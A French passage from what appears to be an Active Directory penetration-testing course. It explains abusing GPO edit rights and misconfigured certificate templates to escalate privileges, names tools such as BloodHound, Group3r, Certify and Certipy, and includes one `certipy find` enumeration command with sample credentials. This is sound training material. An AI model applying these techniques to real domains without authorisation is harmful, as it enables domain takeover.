Concrètement, les GPO sont un ensemble de règles/actions qui s’appliquent à un ensemble bien défini d’ordinateurs et d’utilisateurs. Une GPO permet de faire beaucoup, beaucoup de choses, comme modifier l’écran de veille, paramétrer des réseaux Wi-Fi, régler le pare-feu, modifier les administrateurs locaux, lancer des scripts au démarrage du poste, etc.
- Vous comprenez bien que si vous avez le droit de modifier une GPO, vous serez capable de faire beaucoup de choses sur les objets sur lesquels elle s’applique. L’outil `BloodHound` vous permet de découvrir les utilisateurs ou groupes qui ont le droit de modifier une GPO. Si jamais vous en faites partie, alors le mieux est d’utiliser votre machine virtuelle Windows Server pour aller modifier la GPO.
- Sachez également qu’il arrive que des informations sensibles soient stockées dans les GPO, comme des mots de passe d’administrateurs locaux par exemple, ou que des paramètres dangereux soient positionnés. L’outil `Group3r` a été créé pour analyser le contenu de toutes les GPO afin d’extraire de potentielles informations intéressantes pour un attaquant.


## Exploitez une PKI (Public Key Infrastructure)
Une infrastructure de gestion de clés publiques permet de gérer l’ensemble des clés publiques des utilisateurs. Dans un Active Directory, cela permet notamment de délivrer des certificats aux utilisateurs pour différentes finalités. Ça peut être par exemple utilisé pour une authentification 802.1X, pour des accès VPN, pour chiffrer des flux, signer des scripts PowerShell ou encore pour renforcer des authentifications.
- Lorsqu’un utilisateur fait une demande de certificat à une autorité de certification, il demande en fait une signature de certificat en précisant le modèle de certificat qu’il souhaite, ainsi que les informations nécessaires pour remplir ce modèle. Active Directory dispose en effet de modèles préenregistrés qui permettent de ne pas réinventer la roue. Il est évidemment possible d’ajouter de nouveaux modèles pour tout type d’application. L’autorité de certification va alors vérifier si l’utilisateur a le droit de demander ce type de certificat, avec les informations fournies, et si tout va bien, il renverra au client le certificat signé.
- Le problème, c’est qu’il existe très souvent des erreurs de configuration dans ces modèles de certificats. Si un utilisateur a le droit de modifier un modèle, ou si le modèle est trop permissif et permet à un utilisateur de modifier plus d’informations que prévu, ça peut conduire à une vulnérabilité, voire une compromission du domaine.
- Autre vulnérabilité, si vous avez le droit de modifier un modèle de certificat, vous pouvez le configurer comme expliqué précédemment, afin de pouvoir le demander avec un nom d’utilisateur arbitraire.
- L’outil `Certify` a été conçu pour énumérer les vulnérabilités potentielles dans la mise en place d’une `PKI Active Directory`. Il a été écrit en C#, et donc doit être exécuté depuis une session Windows authentifiée.
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation

```
└─# certipy find -u pixis@medic.ex -p P4ssw0rd -dc-ip 212.129.29.186

```

- Si vous souhaitez en savoir plus sur ce sujet, sachez qu’il existe un papier de 143 pages (en anglais) intitulé Certified Pre-Owned - Abusing Active Directory Certificate Services `https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf`, qui se focalise sur ce type de vulnérabilité.

## En résumé

- Lorsqu’une machine est en délégation sans contrainte, vous pouvez extraire les copies des TGT des utilisateurs pour vous faire passer pour eux.
- Windows permet d’enregistrer des mots de passe à différents endroits, et savoir les trouver ou les extraire vous permettra de compromettre des comptes à privilèges.
- Si vous pouvez modifier une GPO, vous pourrez alors prendre la main sur les ordinateurs ou utilisateurs sur lesquels elle s’applique.
- Lorsqu’une PKI est installée dans un Active Directory, il y a des chances pour qu’un modèle de certificat ne soit pas correctement configuré, et qu’il vous permette d’élever vos privilèges.

Lorsqu’un attaquant compromet des machines, voire un domaine, il passe par la phase de persistance, lui permettant de ne pas perdre les accès durement acquis. Bien comprendre les techniques de persistance vous permettra par ailleurs de vérifier qu’il n’y en a pas dans votre environnement.